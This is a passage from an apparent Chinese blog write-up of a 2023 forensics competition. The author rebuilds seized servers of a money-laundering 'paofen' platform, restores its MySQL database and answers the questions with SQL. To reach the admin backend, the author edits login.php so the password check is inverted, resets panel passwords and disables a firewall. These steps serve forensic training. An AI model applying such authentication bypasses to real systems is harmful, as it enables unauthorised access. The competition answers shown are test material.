src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107193346799.png" alt="image-20251107193346799"></p><p>然后把<code>mysql</code>服务先打开</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107194223278.png" alt="image-20251107194223278"></p><p>接下来就是利用数据库备份文件修复数据库，使用命令，然后输入密码为<code>3W.pa0fen.com</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -uroot -p paofen &lt; ./paofen.sql</span><br></pre></td></tr></table></figure><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107193615263.png" alt="image-20251107193615263"></p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107194318584.png" alt="image-20251107194318584"></p><p>接下来就是进入一下数据库<code>mysql -uroot -p3W.pa0fen.com</code>，输入命令来开启mysql的一些日志</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> global general_log = ON;</span><br><span class="line"><span class="built_in">set</span> global general_log_file=<span class="string">&quot;/tmp/general.log&quot;</span>；</span><br></pre></td></tr></table></figure><p>配置好后将<code>web</code>服务器也给关了，然后访问<code>http://192.168.91.141:8083/admin.php</code>就可以跳转到后台登录界面了。</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107203827730.png" alt="image-20251107203827730"></p><p>然后使用<code>navicat</code>连接数据库</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107204058863.png" alt="image-20251107204058863"></p><p>发现<code>admin</code>的密码不是明文存储</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107204136759.png" alt="image-20251107204136759"></p><p>直接去修改php源码在这个路径下<code>/www/admin.paofen.com/app/admin/controller/</code>发现有调用一个函数来处理用户和密码</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107204717928.png" alt="image-20251107204717928"></p><p>之后再<code>/www/admin.paofen.com/app/admin/logic/</code>目录下找到了<code>login.php</code>文件，找到这个判断文件，直接将判断<code>$password</code>等于的变成不等于，接下来尝试登录</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107204808799.png" alt="image-20251107204808799"></p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107212031481.png" alt="image-20251107212031481"></p><p>修改登录逻辑后就可以直接登录成功了</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107212049032.png" alt="image-20251107212049032"></p><h2 id="question19">question19√</h2><p>请分析服务器，给出跑分网站后台用户余额总计？[答案格式:1000]</p><p>重构完网站就能看到</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107212130413.png" alt="image-20251107212130413"></p><ul><li>答案：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">7459848</span></span><br></pre></td></tr></table></figure><h2 id="question20">question20√</h2><p>请分析服务器，给出跑分平台后台未处理的用户申请有多少个？[答案格式:1000]</p><p>一开始不同明白<code>后天</code>是什么鬼，后来反映过来是后台，应该是<code>24+0+0=24</code></p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107212513100.png" alt="image-20251107212513100"></p><ul><li>答案：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">24</span><br></pre></td></tr></table></figure><h2 id="question21">question21√</h2><p>请分析服务器，给出会员聂鸿熙推荐人的姓名？[答案格式:张三]</p><p>直接找到会员列表，搜索<code>聂鸿熙</code>，找到推荐人</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107212826585.png" alt="image-20251107212826585"></p><ul><li>答案：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">针长兴</span><br></pre></td></tr></table></figure><h2 id="question22">question22√</h2><p>请分析服务器，给出给出跑分平台内用户银行卡所属银行共有几家？[答案格式:10]</p><p>直接翻数据库，找到<code>user_bank</code></p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107213618543.png" alt="image-20251107213618543"></p><p>使用<code>sql</code>查询语句进行查询操作和去重操作</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT COUNT(DISTINCT bank_name) FROM `ob_user_bank`</span><br></pre></td></tr></table></figure><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107213709906.png" alt="image-20251107213709906"></p><h2 id="question23">question23√</h2><p>接上题，请给出这些银行中用户数最多的银行名称？[答案格式:xx银行]</p><p>继续在<code>ob_user_bank</code>数据库中进行查询</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> bank_name, <span class="built_in">COUNT</span>(<span class="operator">*</span>) <span class="keyword">AS</span> total</span><br><span class="line"><span class="keyword">FROM</span> ob_user_bank</span><br><span class="line"><span class="keyword">GROUP</span> <span class="keyword">BY</span> bank_name;</span><br></pre></td></tr></table></figure><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107214545009.png" alt="image-20251107214545009"></p><ul><li>答案：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">农业银行</span><br></pre></td></tr></table></figure><h2 id="question24">question24√</h2><p>请分析服务器，给出用户“祝虹雨”通过审核的充值总额？[答案格式:10]</p><p>先在数据库中找到他的相关信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM `ob_user` WHERE real_name = &#x27;祝虹雨&#x27;</span><br></pre></td></tr></table></figure><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107215116565.png" alt="image-20251107215116565"></p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107220736539.png" alt="image-20251107220736539"></p><p>然后直接查询</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT SUM(money) FROM `ob_charge_log` WHERE name=<span class="string">&#x27;祝虹雨&#x27;</span> AND `status`=<span class="number">1</span></span><br></pre></td></tr></table></figure><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107220903859.png" alt="image-20251107220903859"></p><h2 id="重构web网站2">重构web网站2</h2><p>接下来就是另一个网站了，因为翻看<code>web</code>服务器的<code>www</code>目录会发现不仅有<code>admin.paofen.com</code>还有一个<code>3w.paofen.com</code>（其实不是这个网站，而是在另一个服务器中有<code>hy.paofen.com</code>），并且之前还看到了<code>nginx</code>上面开放了<code>8084</code>端口</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107221601305.png" alt="image-20251107221601305"></p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107222156517.png" alt="image-20251107222156517"></p><p>接下来要打开这个虚拟机，要调一下线程和内存</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107221722608.png" alt="image-20251107221722608"></p><p>开启后还是要像之前一样改密码，启动起来后直接ssh连接</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107230342257.png" alt="image-20251107230342257"></p><p>发现这个服务器上有宝塔</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107230553585.png" alt="image-20251107230553585"></p><p>直接取消一些宝塔的登录限制，并且修改密码</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107230845543.png" alt="image-20251107230845543"></p><p>直接访问网站</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107230943750.png" alt="image-20251107230943750"></p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107231050679.png" alt="image-20251107231050679"></p><p>开3个服务网址太卡了，直接看数据库吧，发现数据库还有个备份，发现这边的数据库服务已经起起来了</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107231519335.png" alt="image-20251107231519335"></p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107231601747.png" alt="image-20251107231601747"></p><p>直接修改权限连接数据库，发现用原始密码半天登不进去，直接该密吧，还得关闭一下防火墙（或者直接通过面板访问就行，还是太卡了直接把db服务器关了）</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107231628478.png" alt="image-20251107231628478"></p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107232121491.png" alt="image-20251107232121491"></p><ul><li>连接后发现是空表，那就直接恢复数据库</li></ul><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107232949443.png" alt="image-20251107232949443"></p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107233006131.png" alt="image-20251107233006131"></p><p>其实这里网站已经起起来了，只是宝塔没有域名解析到，直接访问对应的ip地址即可，由于之前修改了数据库密码，现在还要修改一下数据库密码才能正常访问网站</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107234952916.png" alt="image-20251107234952916"></p><p>然后查看一下<code>nginx</code>的三个端口<code>888</code>不行、<code>80</code>也不行</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107235050075.png" alt="image-20251107235050075"></p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107235110663.png" alt="image-20251107235110663"></p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107235140564.png" alt="image-20251107235140564"></p><p>发现8085可以，但是网站好像没起来</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107235203184.png" alt="image-20251107235203184"></p><p>宝塔加载这个要加载非常久，最后还会错误提示，之后启动一下就行</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107235711387.png" alt="image-20251107235711387"></p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107235723800.png" alt="image-20251107235723800"></p><p>发现能访问了</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107235747432.png" alt="image-20251107235747432"></p><ul><li>在这个目录下找到了一个比较奇怪的文件名，这个应该就是admin登录页面了</li></ul><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251108000131716.png" alt="image-20251108000131716"></p><ul><li>发现是的</li></ul><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251108000224405.png" alt="image-20251108000224405"></p><h2 id="question25">question25√</h2><p>请分析服务器，给出该跑分团队可能的办公大楼有几个？[答案格式:1]</p><p>恢复数据库后翻找数据库，发现拥有两个会议，那应该有两个办公大楼</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107233215324.png" alt="image-20251107233215324"></p><ul><li>其实更准确的应该在这个表</li></ul><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107233325493.png" alt="image-20251107233325493"></p><ul><li>答案：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2</span><br></pre></td></tr></table></figure><h2 id="question26">question26√</h2><p>请分析服务器，给出用户John共提了几次会议预约申请，通过了几个？[答案格式:1，1]</p><p>看到这个表，看就行</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107233403379.png" alt="image-20251107233403379"></p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107233458164.png" alt="image-20251107233458164"></p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107233648403.png" alt="image-20251107233648403"></p><ul><li>答案：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">9，3</span><br></pre></td></tr></table></figure><h2 id="question27">question27√</h2><p>接上题，用户John哪个时间段的会议预约申请次数最多[答案格式:2000-01-01 00:00-00:00]</p><p>这题尝试了好几次</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107233731644.png" alt="image-20251107233731644"></p><ul><li>答案：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">2023</span>-05-<span class="number">15</span> <span class="number">16</span>:<span class="number">00</span>-<span class="number">16</span>:<span class="number">59</span></span><br></pre></td></tr></table></figure><h2 id="question28">question28√</h2><p>请分析服务器，给出用户Harvey预约了什么时间的会议？[答案格式:2000-01-01 00:00-00:00]</p><p>这题应该<code>Harvey</code>是预约<code>5-17</code>的日期（应该把网站起起来会更好）</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107233939662.png" alt="image-20251107233939662"></p><h2 id="question29">question29√</h2><p>会议管理系统的后台登陆地址是[答案格式:www.baidu.com:8080/login.php]</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251108000318181.png" alt="image-20251108000318181"></p><ul><li>答案：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hy.paofen.com:<span class="number">8085</span>/dkewl.php</span><br></pre></td></tr></table></figure><h1 id="物联取证">物联取证</h1><p>直接开始手撕，手撕之前先要使用<code>binwalk</code>看看偏移之类。</p><p><img 